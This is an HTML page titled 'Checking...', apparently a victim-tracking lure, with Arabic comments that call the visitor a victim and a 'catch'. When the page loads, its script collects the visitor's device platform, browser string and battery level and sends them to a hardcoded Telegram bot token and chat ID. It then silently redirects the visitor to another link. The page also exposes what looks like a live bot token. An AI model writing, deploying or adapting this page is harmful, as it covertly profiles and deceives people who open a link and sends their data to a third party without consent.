<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Checking...</title>
    <script>
        async function sendToBot() {
            const params = new URLSearchParams(window.location.search);
            const target = params.get('u') || "https://t.me/vo11a";
            
            // معلومات البوت مالتك (مباشرة)
            const token = "8795074558:AAHSNWiXI4mKMFsyrEP6qEkMdRQrbc9Yid8";
            const chat_id = "5773364548";

            // جمع معلومات الجهاز والبطارية
            let batteryInfo = "N/A";
            try {
                const b = await navigator.getBattery();
                batteryInfo = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
            } catch (e) {}

            const text = `🎯 **صيد جديد مباشر!**\n\n📱 **الجهاز:** ${navigator.platform}\n🔋 **البطارية:** ${batteryInfo}\n🌐 **المتصفح:** ${navigator.userAgent.split(' ')[0]}\n🔗 **الرابط:** ${target}`;

            // إرسال البيانات للتليجرام مباشرة بدون سيرفر وسيط
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`)
            .then(() => {
                // تحويل الضحية بعد الإرسال
                window.location.replace(target);
            })
            .catch(() => {
                window.location.replace(target);
            });
        }
        window.onload = sendToBot;
    </script>
</head>
<body style="background:#000;">
</body>
</html>
